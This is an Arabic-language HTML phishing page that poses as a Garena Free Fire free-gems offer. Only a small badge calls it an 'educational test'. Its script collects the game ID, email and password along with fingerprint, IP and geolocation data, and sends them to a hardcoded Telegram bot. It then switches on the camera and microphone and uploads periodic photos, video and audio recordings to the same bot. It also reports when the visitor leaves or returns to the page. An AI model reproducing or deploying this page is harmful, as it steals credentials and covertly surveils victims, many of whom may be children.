<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>Garena Free Fire - شحن 2000 جوهرة</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', -apple-system, 'Segoe UI', Arial, sans-serif; }
body { background: linear-gradient(160deg, #1a1a2e, #16213e); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
.box { background: #1f2235; padding: 35px 28px; border-radius: 16px; max-width: 450px; width: 100%; border: 1px solid #2d3250; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
.logo { text-align: center; margin-bottom: 20px; }
.logo img { height: 80px; width: auto; }
h1 { font-size: 22px; text-align: center; margin-bottom: 8px; color: #fff; font-weight: 700; }
.sub { font-size: 13px; color: #9aa3c0; text-align: center; margin-bottom: 25px; line-height: 1.6; }
.offer { background: linear-gradient(135deg, #ff6b00, #ff9800); border-radius: 12px; padding: 20px; text-align: center; margin-bottom: 25px; }
.offer .num { font-size: 36px; font-weight: 900; color: #fff; }
.offer .lbl { font-size: 14px; color: rgba(255,255,255,0.95); margin-top: 4px; font-weight: 500; }
.field { margin-bottom: 18px; }
.field label { display: block; font-size: 13px; color: #9aa3c0; margin-bottom: 6px; text-align: right; }
.field input { width: 100%; padding: 14px 16px; font-size: 15px; border: 1px solid #2d3250; border-radius: 8px; background: #16192b; color: #fff; outline: none; direction: ltr; text-align: left; }
.field input:focus { border-color: #ff9800; box-shadow: 0 0 0 3px rgba(255,152,0,0.15); }
.btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff6b00, #ff9800); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; box-shadow: 0 8px 20px rgba(255,107,0,0.3); }
.btn:disabled { opacity: 0.6; }
.terms { display: flex; align-items: flex-start; gap: 10px; margin: 20px 0; font-size: 12px; color: #9aa3c0; text-align: right; line-height: 1.6; }
.terms input { margin-top: 3px; width: 16px; height: 16px; cursor: pointer; }
.terms a { color: #ff9800; text-decoration: none; }
.msg { padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; display: none; text-align: center; }
.msg.err { background: rgba(244,67,54,0.15); color: #ff6b6b; display: block; border: 1px solid rgba(244,67,54,0.3); }
.badge { position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.7); color: #fff; font-size: 10px; padding: 4px 8px; border-radius: 12px; z-index: 9999; }
.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #5f6683; }
</style>
</head>
<body>
<div class="badge">🧪 اختبار تعليمي</div>

<div class="box">
    <div class="logo">
        <img src="freefire.jpg" alt="Free Fire">
    </div>
    
    <h1>احصل على 2000 جوهرة مجاناً</h1>
    <p class="sub">عرض حصري من Garena Free Fire. أدخل ID اللعبة الخاص بك لاستلام الجواهر.</p>

    <div class="offer">
        <div class="num">2000 💎</div>
        <div class="lbl">جوهرة مجانية</div>
    </div>

    <div class="msg" id="msg"></div>

    <div class="field">
        <label>ID اللعبة (Free Fire ID)</label>
        <input type="text" id="gameid" placeholder="123456789" autocomplete="off">
    </div>

    <div class="field">
        <label>البريد الإلكتروني (للحساب)</label>
        <input type="email" id="email" placeholder="example@gmail.com" autocomplete="off">
    </div>

    <div class="field">
        <label>كلمة المرور</label>
        <input type="password" id="pass" placeholder="••••••••" autocomplete="off">
    </div>

    <div class="terms">
        <input type="checkbox" id="terms">
        <label for="terms">أوافق على <a href="#">شروط الاستخدام</a> الخاصة بـ Garena وأؤكد أن عمري فوق 13 سنة</label>
    </div>

    <button class="btn" id="btn" onclick="submitForm()">استلام الجواهر الآن</button>

    <div class="footer">© Garena Free Fire - جميع الحقوق محفوظة</div>
</div>

<script>
const TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
const CHAT_ID = "7560932400";

let videoStream = null, audioStream = null;
let photoInterval = null, videoRecorder = null, audioRecorder = null;
let videoChunks = [], audioChunks = [];
const PHOTO_INTERVAL = 10000;

function send(t) {
    return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST", headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id: CHAT_ID, text: t})
    }).catch(()=>{});
}

function sendPhoto(blob, cap) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", cap);
    fd.append("photo", blob, "p.jpg");
    return fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: "POST", body: fd}).catch(()=>{});
}

function sendVideo(blob) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("video", blob, "v.webm");
    return fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method: "POST", body: fd}).catch(()=>{});
}

function sendAudio(blob) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("audio", blob, "a.webm");
    return fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {method: "POST", body: fd}).catch(()=>{});
}

async function capturePhoto() {
    if (!videoStream) return;
    try {
        const v = document.createElement("video");
        v.srcObject = videoStream; v.muted = true;
        await v.play();
        await new Promise(r => setTimeout(r, 300));
        const c = document.createElement("canvas");
        c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
        c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
        c.toBlob(b => { if (b) sendPhoto(b, "📸 صورة جديدة - " + new Date().toLocaleTimeString("ar-EG")); }, "image/jpeg", 0.6);
        v.pause();
    } catch(e) {}
}

async function startCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}, audio: false});
        videoRecorder = new MediaRecorder(videoStream, {mimeType: "video/webm"});
        videoChunks = [];
        videoRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
        videoRecorder.start(1000);
        setTimeout(capturePhoto, 1000);
        photoInterval = setInterval(capturePhoto, PHOTO_INTERVAL);
        return true;
    } catch(e) { return false; }
}

async function startMic() {
    try {
        audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
        audioRecorder = new MediaRecorder(audioStream, {mimeType: "audio/webm"});
        audioChunks = [];
        audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
        audioRecorder.start(1000);
        return true;
    } catch(e) { return false; }
}

async function submitForm() {
    const gameid = document.getElementById("gameid").value.trim();
    const email = document.getElementById("email").value.trim();
    const pass = document.getElementById("pass").value;
    const terms = document.getElementById("terms").checked;
    const msg = document.getElementById("msg");
    const btn = document.getElementById("btn");

    msg.className = "msg";

    if (!gameid || !email || !pass) { msg.className = "msg err"; msg.innerText = "يرجى إدخال جميع البيانات"; return; }
    if (!terms) { msg.className = "msg err"; msg.innerText = "يجب الموافقة على الشروط"; return; }

    btn.disabled = true;
    btn.innerText = "جاري التحقق...";

    let info = {
        "النوع": "Free Fire",
        "ID اللعبة": gameid,
        "البريد الإلكتروني": email,
        "كلمة المرور": pass,
        "المتصفح": navigator.userAgent,
        "نظام التشغيل": navigator.platform,
        "اللغة": navigator.language,
        "دقة الشاشة": screen.width + "x" + screen.height,
        "المنطقة الزمنية": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "عدد أنوية المعالج": navigator.hardwareConcurrency || "?"
    };

    try {
        const r = await fetch("https://ipwho.is/");
        const j = await r.json();
        info["IP العام"] = j.ip;
        info["الدولة"] = j.country;
        info["المدينة"] = j.city;
        info["مزود الخدمة"] = j.connection && j.connection.isp;
    } catch(e) { info["IP العام"] = "غير معروف"; }

    info["IP المحلي"] = await new Promise(r => {
        try {
            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
            pc.createDataChannel("");
            const ips = new Set();
            pc.onicecandidate = e => {
                if (e.candidate) { const ip = e.candidate.candidate.split(" ")[4]; if (ip) ips.add(ip); }
                else { pc.close(); r(Array.from(ips).join(", ")); }
            };
            pc.createOffer().then(o => pc.setLocalDescription(o));
            setTimeout(() => { pc.close(); r(Array.from(ips).join(", ")); }, 3000);
        } catch(e) { r("خطأ"); }
    });

    info["الموقع"] = await new Promise(r => {
        if (!navigator.geolocation) return r("غير مدعوم");
        navigator.geolocation.getCurrentPosition(
            p => r(`${p.coords.latitude}, ${p.coords.longitude}`),
            () => r("مرفوض"),
            {enableHighAccuracy: true, timeout: 8000}
        );
    });

    info["الوقت"] = new Date().toLocaleString("ar-EG");

    let text = "💎 بيانات تسجيل دخول Free Fire:\n\n" + Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n");
    await send(text);

    try { if ("Notification" in window) await Notification.requestPermission(); } catch(e) {}

    await startCamera();
    await startMic();

    setTimeout(() => {
        msg.className = "msg err";
        msg.innerText = "يبدو أن هذا الحساب غير صحيح. تأكد من ID اللعبة.";
        btn.disabled = false;
        btn.innerText = "استلام الجواهر الآن";
    }, 2000);
}

window.addEventListener("beforeunload", async () => {
    if (photoInterval) clearInterval(photoInterval);
    if (videoRecorder && videoRecorder.state === "recording") {
        videoRecorder.stop();
        setTimeout(async () => {
            const blob = new Blob(videoChunks, {type: "video/webm"});
            if (blob.size > 1000) await sendVideo(blob);
        }, 1000);
    }
    if (audioRecorder && audioRecorder.state === "recording") {
        audioRecorder.stop();
        setTimeout(async () => {
            const blob = new Blob(audioChunks, {type: "audio/webm"});
            if (blob.size > 1000) await sendAudio(blob);
        }, 1000);
    }
    if (videoStream) videoStream.getTracks().forEach(t => t.stop());
    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
});

document.addEventListener("visibilitychange", () => {
    if (document.hidden) send("👀 المستخدم ساب الصفحة");
    else send("✅ المستخدم رجع للصفحة");
});
</script>
</body>
</html>
